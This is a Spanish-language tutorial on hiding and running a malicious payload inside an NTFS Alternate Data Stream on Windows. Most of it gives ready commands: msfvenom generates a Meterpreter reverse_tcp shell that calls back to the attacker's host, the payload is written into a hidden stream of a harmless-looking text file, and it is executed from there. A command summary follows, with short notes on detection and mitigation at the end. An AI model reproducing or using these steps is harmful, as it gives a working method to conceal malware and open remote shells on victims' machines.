# Flujos de Datos Alternativos (ADS) en NTFS para ocultar un payload

---

## ¿Qué es un flujo de datos alternativo?

- NTFS (sistema de archivos de Windows) permite asociar **múltiples flujos de datos** a un único archivo.
- El contenido "visible" es el flujo principal (`:$DATA`), pero se pueden añadir flujos adicionales ocultos.
- Estos flujos no son detectados por herramientas básicas como `dir` ni por el Explorador de Windows.
- Técnica útil para ocultar código malicioso (payloads) en archivos aparentemente inocuos.

---

## ¿Cómo identificar un sistema vulnerable?

- Solo funciona en volúmenes formateados con **NTFS**.
- Puedes comprobar el sistema de archivos con:
```
fsutil fsinfo volumeinfo C:
```
- Si dice `File System Name: NTFS`, puedes usar ADS en esa unidad.

---

# Crear y ejecutar un payload oculto en un ADS

---

## 1️⃣ Generar un payload

Por ejemplo, un Meterpreter con msfvenom:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > payload.exe
```

---

## 2️⃣ Asociar el payload como flujo alternativo

Supón que tienes un archivo inocente llamado `legit.txt`.

Para guardar el payload en un flujo oculto:
```
type payload.exe > legit.txt:hidden.exe
```

Esto guarda el contenido de `payload.exe` en el flujo `hidden.exe` de `legit.txt`.

---

## 3️⃣ Verificar que está oculto

Si haces un `dir`, sólo verás:
```
legit.txt
```

No aparece `hidden.exe`.

---

## 4️⃣ Ejecutar el payload desde el flujo alternativo

Puedes lanzar el contenido oculto del flujo usando:
```
start .\legit.txt:hidden.exe
```

O con `cmd.exe`:
```
cmd.exe /c legit.txt:hidden.exe
```

Esto ejecutará el payload contenido en el flujo alternativo.

---

# Resumen de comandos

| Acción                                  | Comando                                     |
|----------------------------------------|-------------------------------------------|
| Comprobar NTFS                         | `fsutil fsinfo volumeinfo C:`            |
| Crear payload                          | `msfvenom ... > payload.exe`             |
| Esconder payload en ADS                | `type payload.exe > legit.txt:hidden.exe`|
| Listar archivo principal              | `dir`                                    |
| Ejecutar el flujo alternativo         | `start .\legit.txt:hidden.exe`           |

---

## Notas

- ADS solo es válido en volúmenes NTFS.
- Herramientas como `streams.exe` de Sysinternals pueden detectar y listar los ADS:
```
streams legit.txt
```
- Antimalware moderno suele inspeccionar los ADS y puede detectarlos.

---

## Mitigación (para administradores)

- Evitar el uso de NTFS en escenarios de alto riesgo si no es necesario.
- Usar herramientas para auditar ADS regularmente.
- Restringir permisos de escritura y ejecución en carpetas críticas.
